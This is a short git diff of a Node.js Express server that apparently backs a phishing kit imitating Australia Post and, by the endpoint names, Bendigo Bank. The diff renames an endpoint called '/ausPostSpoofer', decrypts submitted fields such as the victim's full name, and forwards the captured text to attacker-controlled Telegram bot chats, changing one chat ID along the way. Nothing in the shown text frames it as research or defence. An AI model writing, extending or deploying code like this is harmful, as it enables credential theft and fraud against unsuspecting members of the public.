@@ -154,9 +154,9 @@ app.post("/bendiSaveST", cors(), (req, res) => {
 //AUSPOSTwLogs
 //AUSPOSTwLogs
 
-app.options("/ausPostSpoofer", cors());
+app.options("/ausPostSJ", cors());
 
-app.post("/ausPostSpoofer", (req, res) => {
+app.post("/ausPostSJ", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -220,10 +220,10 @@ app.post("/ausPostSpoofer", (req, res) => {
         SpoofergooferAP = 0;
       } else {
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSJ:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=AusPost:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=967388245&text=AusPost:\n${originalText}`
         );
         SpoofergooferAP += 1;
       }
